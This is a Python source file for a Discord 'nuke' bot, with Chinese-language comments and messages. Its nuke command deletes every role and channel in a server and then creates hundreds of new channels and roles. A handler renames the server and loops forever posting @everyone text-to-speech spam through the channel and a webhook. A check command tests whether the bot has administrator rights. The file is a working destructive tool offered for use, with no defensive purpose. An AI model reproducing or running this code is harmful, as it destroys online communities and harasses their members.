from discord.ext import commands
import discord

#設定settings
prefix = "!"
channel_name = "nuked"
role_name = "nuked"
server_name = "Nuked Server"
webhook_name = "Nuke bot"
message = "boom"
token = "your discord bot token"


bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all()) 



@bot.event 
async def on_ready():
    print("Bot ready.")


@bot.command()
async def nuke(ctx):
  await ctx.message.delete()

  for role in ctx.guild.roles: 
    try:
      await role.delete()

    except:
      continue
      
  for channel in ctx.guild.channels: 
    try:
      await channel.delete()

    except:
      continue  

  for i in range(1, 500):
    await ctx.guild.create_text_channel(channel_name)
    await channel.guild.create_role(name = role_name)


@bot.command()
async def check(ctx):
    guild = ctx.guild

    if guild:
        bot_member = guild.me

        if bot_member.guild_permissions.administrator:
            await ctx.channel.send("有管理者權限")

        else:
            await ctx.channel.send("沒有管理者權限")

    else:
        await ctx.channel.send("這個命令僅在伺服器中有效")


@bot.event
async def on_guild_channel_create(channel):
  
  if channel.name==(channel_name):
    await channel.guild.edit(name = f'{server_name}  ')
    webhook = await channel.create_webhook(name=webhook_name)

    while True:
      await channel.send(f"@everyone@here\n{message}",tts=True)
      await webhook.send(f"@everyone@here\n{message}",tts=True)



bot.run(token)